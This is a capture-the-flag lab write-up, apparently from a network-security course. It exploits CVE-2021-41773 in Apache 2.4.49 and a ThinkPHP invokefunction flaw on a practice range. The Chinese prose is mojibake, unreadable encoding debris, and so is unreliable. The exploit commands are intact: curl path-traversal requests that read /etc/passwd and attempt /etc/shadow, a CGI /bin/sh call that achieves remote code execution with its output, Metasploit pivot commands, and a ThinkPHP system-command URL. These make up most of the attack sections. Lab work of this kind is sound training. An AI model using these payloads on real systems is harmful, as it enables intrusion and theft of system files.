##### 2.6 ä¿¡æ¯æ”¶é›†æ€»ç»“

1. **æ¼æ´ç¡®è®¤**:

   - Apacheç‰ˆæœ¬2.4.49**å®Œå…¨åŒ¹é…CVE-2021-41773çš„å—å½±å“ç‰ˆæœ¬**
   - æœåŠ¡å™¨é…ç½®æ ‡å‡†ï¼Œæœªå‘ç°ç‰¹æ®Šçš„å®‰å…¨åŠ å›º
2. **æ”»å‡»æ¡ä»¶æ»¡è¶³**:

   - **ç‰ˆæœ¬åŒ¹é…**: ç¡®è®¤ä¸ºæ˜“å—æ”»å‡»çš„Apacheç‰ˆæœ¬
   - **æœåŠ¡é…ç½®**: æ ‡å‡†Apacheé…ç½®ï¼Œä¸ºè·¯å¾„éå†æ”»å‡»æä¾›äº†æ¡ä»¶
3. **å®‰å…¨æ€åŠ¿è¯„ä¼°**:

   - **é«˜é£é™©**: ç‰ˆæœ¬å®Œå…¨åŒ¹é…å·²çŸ¥é«˜å±æ¼æ´
   - **é…ç½®è–„å¼±**: ç¼ºå°‘å¤šä¸ªå®‰å…¨å¤´ï¼Œä¿¡æ¯æ³„éœ²é£é™©
   - **æ”»å‡»é¢**: CGIåŠŸèƒ½å¯ç”¨ï¼Œä¸ºä»£ç æ‰§è¡Œæä¾›äº†å¯èƒ½

#### 3. æ¼æ´åˆ†æä¸åˆ©ç”¨

##### 3.1 CVE-2021-41773 æ¼æ´åŸç†

**æ¼æ´åŸºæœ¬ä¿¡æ¯**:

- **CVEç¼–å·**: CVE-2021-41773
- **CVSSè¯„åˆ†**: 7.5 (é«˜å±)
- **æ¼æ´ç±»å‹**: è·¯å¾„éå† (Path Traversal)
- **å½±å“ç‰ˆæœ¬**: Apache HTTP Server 2.4.49
- **æ¼æ´åŸç†**: Apache 2.4.49ç‰ˆæœ¬åœ¨å¤„ç†URLè·¯å¾„è§„èŒƒåŒ–æ—¶å­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„URLç¼–ç ç»•è¿‡è·¯å¾„é™åˆ¶ï¼Œè®¿é—®Webæ ¹ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶

**æŠ€æœ¯ç»†èŠ‚**:

- **æ ¹æœ¬åŸå› **: Apacheå¯¹URLä¸­çš„è·¯å¾„åˆ†éš”ç¬¦å’Œç‚¹å·åºåˆ—çš„å¤„ç†ä¸å½“
- **ç»•è¿‡æœºåˆ¶**: ä½¿ç”¨URLç¼–ç çš„ç‚¹å·(`%2e`)å¯ä»¥ç»•è¿‡è·¯å¾„è§„èŒƒåŒ–æ£€æŸ¥
- **æ”»å‡»è·¯å¾„**: é€šè¿‡Aliasæ˜ å°„çš„ç›®å½•(å¦‚ `/cgi-bin/`, `/icons/`)è¿›è¡Œè·¯å¾„éå†

##### 3.2 è·¯å¾„éå†æ”»å‡»å®è·µ

###### 3.2.1 åŸºç¡€è·¯å¾„éå†æµ‹è¯•

```bash
# å°è¯•é€šè¿‡CGIè·¯å¾„è¯»å– /etc/passwd æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•è¯»å– Apache é…ç½®æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"

# å°è¯•è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version"
```

**æ‰§è¡Œç»“æœåˆ†æ**:
æ‰€æœ‰é€šè¿‡ `/cgi-bin/`è·¯å¾„çš„æ”»å‡»å°è¯•éƒ½è¿”å›äº† `500 Internal Server Error`ï¼Œè¿™è¡¨æ˜ï¼š

1. **CGIé…ç½®é—®é¢˜**: CGIæ¨¡å—å¯èƒ½æ²¡æœ‰æ­£ç¡®é…ç½®æˆ–ç¼ºå°‘å¿…è¦çš„CGIè„šæœ¬
2. **è·¯å¾„è§£æé—®é¢˜**: Apacheå¯èƒ½å¯¹CGIè·¯å¾„ä¸‹çš„è·¯å¾„éå†æœ‰ç‰¹æ®Šå¤„ç†
3. **æƒé™é™åˆ¶**: å¯èƒ½å­˜åœ¨é¢å¤–çš„è®¿é—®æ§åˆ¶æœºåˆ¶

###### 3.2.2 éCGIè·¯å¾„çš„ç›´æ¥éå†æ”»å‡»

CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œæˆ‘ä»¬å°è¯•å…¶ä»–æ˜ å°„è·¯å¾„ï¼š

```bash
# å°è¯•é€šè¿‡iconsè·¯å¾„è¿›è¡Œéå†
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# å°è¯•é€šè¿‡manualè·¯å¾„è¿›è¡Œéå†  
curl "http://10.37.133.3:42286/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# ç›´æ¥æ ¹è·¯å¾„å°è¯•
curl "http://10.37.133.3:42286/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**æ‰§è¡Œç»“æœ**:

```bash
â”Œâ”€â”€(kaliã‰¿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
â””â”€$ curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

**æ”»å‡»ç»“æœåˆ†æ**:

1. âœ… **`/icons/` è·¯å¾„æ”»å‡»æˆåŠŸ**

   - **çŠ¶æ€**: ğŸ‰ å®Œå…¨æˆåŠŸ - è¯»å–åˆ°å®Œæ•´çš„ `/etc/passwd` æ–‡ä»¶
   - **ç¼–ç æ–¹å¼**: ä»…ä½¿ç”¨åŸºç¡€çš„å•å±‚URLç¼–ç  `%2e%2e`ï¼ˆä¸éœ€è¦åŒé‡ç¼–ç ï¼‰
   - **æŠ€æœ¯æ„ä¹‰**: è¯æ˜CVE-2021-41773ä¸ä»…é™äºCGIè·¯å¾„ï¼Œè¿˜å½±å“Apacheçš„é™æ€èµ„æºæ˜ å°„
2. ğŸš« **`/manual/` è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: Manualæ–‡æ¡£è·¯å¾„å¯èƒ½æœ‰ç‰¹æ®Šçš„è®¿é—®æ§åˆ¶é…ç½®
   - **å®‰å…¨ç­–ç•¥**: è¡¨æ˜æŸäº›è·¯å¾„æ˜ å°„æœ‰é¢å¤–çš„å®‰å…¨é™åˆ¶
3. ğŸš« **ç›´æ¥æ ¹è·¯å¾„è¢«é˜»æ­¢**

   - **çŠ¶æ€**: 403 Forbidden
   - **åŸå› **: æ ¹è·¯å¾„çš„è·¯å¾„éå†è¢«Apacheçš„åŸºç¡€å®‰å…¨æœºåˆ¶é˜»æ­¢

##### 3.3 è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ”»å‡»

###### 3.3.1 CGIè·¯å¾„çš„RCEæ”»å‡»å°è¯•

```bash
# é€šè¿‡CGIè·¯å¾„æ‰§è¡Œshellå‘½ä»¤
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

**RCEæ”»å‡»ç»“æœ**:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**ğŸ‰ RCEæ”»å‡»æˆåŠŸï¼**

- **æƒé™è·å–**: æˆåŠŸä»¥ `www-data`ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤
- **æ”»å‡»æ–¹å¼**: é€šè¿‡CGIè·¯å¾„ç»“åˆè·¯å¾„éå†ï¼Œç›´æ¥è°ƒç”¨ç³»ç»Ÿshell
- **ç¼–ç æŠ€æœ¯**: ä½¿ç”¨æ··åˆç¼–ç  `.%2e`ç»•è¿‡è·¯å¾„é™åˆ¶

###### 3.3.2 ç³»ç»Ÿä¿¡æ¯æ”¶é›†

```bash
# è·å–ç³»ç»Ÿä¿¡æ¯
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; uname -a"

# æŸ¥çœ‹å½“å‰ç›®å½•
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; pwd"

# åˆ—å‡ºæ ¹ç›®å½•å†…å®¹
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; ls -la /"
```

##### 3.4 Flagæ–‡ä»¶æœç´¢ä¸è·å–

###### 3.4.1 ç³»ç»Ÿæ–‡ä»¶æœç´¢

```bash
# æœç´¢ç³»ç»Ÿä¸­æ‰€æœ‰åŒ…å«flagçš„æ–‡ä»¶
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"
```

**æœç´¢ç»“æœ**:

```bash
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.0/tty/ttyS0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/ss_flags.ph
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/waitflags.ph
```

**ğŸ¯ æ‰¾åˆ°äº†ï¼flagæ–‡ä»¶åœ¨ `/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`**

###### 3.4.2 Flagå†…å®¹è¯»å–

```bash
# è¯»å–flagæ–‡ä»¶å†…å®¹
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; cat /tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}"
```

**Flagè·å–æˆåŠŸ**: `flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`

### æ­¥éª¤å…­ å‘ç°ç»ˆç‚¹é¶æ ‡

åŒæ ·ï¼Œip aæŸ¥çœ‹ç¬¬äºŒå±‚é¶æœºçš„ç½‘å¡ï¼Œå‘ç°åŒç½‘å¡
![](./pics/å‘ç°åŒç½‘å¡.png)
å‡çº§shell
`sessions -u <>`
è¿›å…¥æ–°å¯åŠ¨çš„shell
`sessions -i <>`
è®¾ç½®pivotè·¯ç”±
`run autoroute -s 10,10,10,0/24`
![](./pics/è®¾ç½®pivotè·¯ç”±.png)<br>
![](./pics/è®¾ç½®pivotè·¯ç”±æˆåŠŸ.png)<br>
æ‰«æå‘ç°ç»ˆç‚¹é¶æ ‡
![](./pics/å‘ç°ç»ˆç‚¹é¶æ ‡.png)<br>

### æ­¥éª¤å…­ æ”»å‡»ç»ˆç‚¹é¶æ ‡

#### thinkphp

cve_2018_1002015
1. æµè§ˆå™¨è®¿é—®ä»¥ä¸‹ç½‘é¡µ
![](./pics/è®¿é—®thinkphp.png)

2. æµè§ˆå™¨è®¿é—®ä»¥ä¸‹ç½‘é¡µï¼Œæ‰§è¡Œphpinfo()
`http://<ç›®æ ‡IP>:<ç«¯å£>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
![](./pics/phpinfo.png)<br>
3. æ‰§è¡Œç³»ç»Ÿå‘½ä»¤`ls /tmp`

`http://<ç›®æ ‡IP>:<ç«¯å£>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20/tmp`
![](./pics/ç¬¬ä¸‰ä¸ªflag.png)<br>

## å‚è€ƒèµ„æ–™

[æ•™å­¦è¯¾ä»¶](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)
[æ•™å­¦è§†é¢‘ã€ç½‘ç»œå®‰å…¨(2023) ç»¼åˆå®éªŒã€‘](https://www.bilibili.com/video/BV1p3411x7da?vd_source=e1f7434c660a15bfac556224e06c742a)
[æ•™å­¦è§†é¢‘ã€ç¬¬å…­ç«  ç½‘ç»œä¸ç³»ç»Ÿæ¸—é€ã€‘](https://www.bilibili.com/video/BV1qV41127Xv?p=10&vd_source=e1f7434c660a15bfac556224e06c742a)
